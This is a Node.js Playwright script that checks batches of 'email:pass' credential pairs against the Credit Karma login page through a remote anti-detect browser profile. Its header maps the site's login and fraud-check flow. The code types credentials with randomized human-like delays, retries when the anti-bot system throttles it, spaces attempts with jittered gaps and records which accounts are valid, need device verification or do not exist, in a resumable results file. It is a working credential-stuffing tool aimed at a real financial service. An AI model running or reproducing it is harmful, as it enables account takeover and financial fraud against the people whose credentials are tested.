#!/usr/bin/env node
/**
 * Credit Karma (Intuit) login automation via remote CloakBrowser profile.
 *
 * Flow mapped:
 *   GET https://www.creditkarma.com/auth/logon?ref=hpherokycco_v1
 *     -> #logonform (action=accounts.creditkarma.com/authorize)
 *     -> POST accounts.creditkarma.com/init      -> {csrfToken, fraud:{fraudSessionId,...}, geo}
 *     -> fill #username / #password, click #Logon
 *     -> POST accounts.creditkarma.com/access    -> 400 {errorCode:1,"Unable to contact Credit Karma, please try again later."} | 200 {options:[{type:"PASSWORD",details:{value:"b*****o@y****.com"}}]}
 *     -> on success: OAuth authorize redirect away from logon
 *
 * Verdicts:
 *   INVALID_EMAIL   "Email not found. This email is not associated with an Intuit Credit Karma account"
 *   INVALID_CREDS   URL carries error_code=try_again (+ inline "technical issue" toast)
 *   TRANSIENT       /access 400 errorCode:1 "Unable to contact Credit Karma" (anti-bot/throttle) - retryable
 *   DEVICE_VERIFY   left logon onto a verify/mfa/otp page (creds valid, extra step needed)
 *   SUCCESS         left logon onto a dashboard/home page
 *
 * Usage:
 *   node creditkarma_login.mjs "user:pass" "user2:pass2" ...
 *   node creditkarma_login.mjs --batch <file> [--gap 15] [--out /tmp/ck_batch_results.json] [--retries 3]
 *
 * Results JSON is resumable: definitive statuses are skipped on restart,
 * transient ones are retried.
 */
import { chromium } from '/Volumes/Spare/npm/global/lib/node_modules/@playwright/mcp/node_modules/playwright/index.mjs';
import fs from 'node:fs';

const CDP = process.env.CK_CDP || 'wss://clk.mrme.tech/api/profiles/912925dd-a2fc-48db-b364-0259330952cd/cdp';
const TOKEN = process.env.CBPM_API_TOKEN || 'change-me-to-a-secure-token';
const LOGIN = 'https://www.creditkarma.com/auth/logon?ref=hpherokycco_v1';

const rand = (a, b) => Math.round(a + Math.random() * (b - a));
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function connect() {
  return chromium.connectOverCDP(CDP, { timeout: 30000, headers: { Authorization: 'Bearer ' + TOKEN } });
}

async function typeField(page, sel, text) {
  await page.click(sel);
  await sleep(rand(150, 450));
  await page.type(sel, text, { delay: rand(30, 80) });
  await sleep(rand(120, 350));
}

async function tryLogin(browser, u, p) {
  const ctx = browser.contexts()[0];
  const page = await ctx.newPage();
  let access = null; // /access response: {st, body}
  page.on('response', async r => {
    if (/\/access$/.test(r.url()) && r.request().method() === 'POST') {
      let b = '';
      try { b = await r.text(); } catch {}
      access = { st: r.status(), b };
    }
  });
  try {
    await ctx.clearCookies();
    await page.goto(LOGIN, { waitUntil: 'load', timeout: 60000 }).catch(() => {});
    await page.waitForSelector('#username', { timeout: 30000 }).catch(() => {});
    const hasForm = await page.evaluate(() => !!document.querySelector('#logonform')).catch(() => false);
    if (!hasForm) return { status: 'UNKNOWN', detail: 'logon form missing (page: ' + page.url().slice(0, 70) + ')' };

    await typeField(page, '#username', u);
    await sleep(rand(300, 700));
    await typeField(page, '#password', p);
    await sleep(rand(400, 900));

    await page.click('#Logon');
    await sleep(rand(9000, 11000));

    const state = await page.evaluate(() => ({
      url: location.href,
      body: document.body.innerText.replace(/\s+/g, ' ').slice(0, 350),
    })).catch(() => ({ url: '', body: '' }));
    if (access) state.access = access;
    return classify(state);
  } finally {
    await page.close().catch(() => {});
  }
}

function classify(o) {
  const t = o.body;
  // 1) anti-bot / throttle: /access 400 errorCode 1
  if (o.access && o.access.st === 400 && /Unable to contact Credit Karma/i.test(o.access.b)) {
    return { status: 'TRANSIENT', detail: 'access 400: ' + o.access.b.slice(0, 100) };
  }
  // 2) email not registered (inline error, no PASSWORD option offered)
  if (/Email not found|not associated with an Intuit Credit Karma/i.test(t)) {
    return { status: 'INVALID_EMAIL', detail: t.slice(0, 120) };
  }
  // 3) account probe returned PASSWORD option but login bounced back
  if (/error_code=try_again/.test(o.url)) {
    return { status: 'INVALID_CREDS', detail: (o.access ? o.access.b.slice(0, 80) + ' | ' : '') + 'error_code=try_again: ' + t.slice(0, 90) };
  }
  // 4) left the logon page
  const onLogon = /\/auth\/logon/.test(o.url);
  if (!onLogon && /^https?:\/\//.test(o.url)) {
    if (/verify|mfa|otp|pin|challenge|security/.test(o.url)) {
      return { status: 'DEVICE_VERIFY', detail: 'redirected to: ' + o.url.slice(0, 90) };
    }
    return { status: 'SUCCESS', detail: 'left logon: ' + o.url.slice(0, 90) };
  }
  if (!/^https?:\/\//.test(o.url)) return { status: 'ERROR', detail: 'connection failed: ' + o.url.slice(0, 60) };
  // 5) generic login error text
  if (/incorrect|invalid|wrong|doesn'?t match|do not match/i.test(t)) return { status: 'INVALID_CREDS', detail: t.slice(0, 120) };
  // 6) account exists (PASSWORD option) but nothing else -> unknown, treat as transient
  if (o.access && /"options"/.test(o.access.b)) return { status: 'TRANSIENT', detail: 'account exists, no verdict: ' + o.access.b.slice(0, 100) };
  return { status: 'UNKNOWN', detail: (o.access ? 'access:' + o.access.st + ' ' + o.access.b.slice(0, 100) + ' | ' : '') + t.slice(0, 130) };
}

/** Accept `email:pass` lines. */
function parsePair(line) {
  line = line.trim();
  if (!line) return null;
  const i = line.indexOf(':');
  if (i === -1) return null;
  return [line.slice(0, i), line.slice(i + 1)];
}

// ---- main ----
const args = process.argv.slice(2);
const batchIdx = args.indexOf('--batch');
const raw = batchIdx !== -1 ? args[batchIdx + 1] : args.filter(a => !a.startsWith('--')).join(',');
const lines = (raw && fs.existsSync(raw) ? fs.readFileSync(raw, 'utf8').split('\n') : (raw || '').split(',')).map(parsePair).filter(Boolean);
const seen = new Set();
const pairs = lines.filter(([u]) => (seen.has(u) ? false : (seen.add(u), true)));
if (!pairs.length) { console.log('usage: node creditkarma_login.mjs "user:pass" | --batch <file>'); process.exit(1); }

const gapIdx = args.indexOf('--gap');
const GAP_BASE = gapIdx !== -1 ? Number(args[gapIdx + 1]) || 15 : 15;
const outIdx = args.indexOf('--out');
const OUT = outIdx !== -1 ? args[outIdx + 1] : '/tmp/ck_batch_results.json';
const retryIdx = args.indexOf('--retries');
const MAX_ATTEMPTS = retryIdx !== -1 ? Number(args[retryIdx + 1]) || 3 : 3;
const results = fs.existsSync(OUT) ? JSON.parse(fs.readFileSync(OUT, 'utf8')) : {};
const SKIP_STATUS = { INVALID_EMAIL: 1, INVALID_CREDS: 1, SUCCESS: 1, DEVICE_VERIFY: 1 };

let browser = null;
try {
  for (const [u, p] of pairs) {
    if (results[u] && SKIP_STATUS[results[u].status]) { console.log(`${u} -> SKIP (already ${results[u].status})`); continue; }
    if (!browser) browser = await connect();
    let res;
    for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
      try {
        res = await tryLogin(browser, u, p);
        console.log(`${u} -> ${res.status} (${res.detail})`);
        if (res.status !== 'TRANSIENT' && res.status !== 'UNKNOWN') break;
      } catch (e) {
        console.log(`${u} -> ERROR: ${e.message.slice(0, 100)}`);
        res = { status: 'ERROR', detail: e.message.slice(0, 150) };
        try { await browser.close(); } catch {}
        browser = null;
        break;
      }
    }
    results[u] = res;
    fs.writeFileSync(OUT, JSON.stringify(results, null, 1));
    if (batchIdx !== -1 && pairs.length > 1) { const gap = rand(GAP_BASE * 0.5, GAP_BASE * 1.5) * 1000; console.log('waiting ' + Math.round(gap / 1000) + 's...'); await sleep(gap); }
  }
} finally {
  if (browser) await browser.close().catch(() => {});
}
console.log('results saved to ' + OUT);
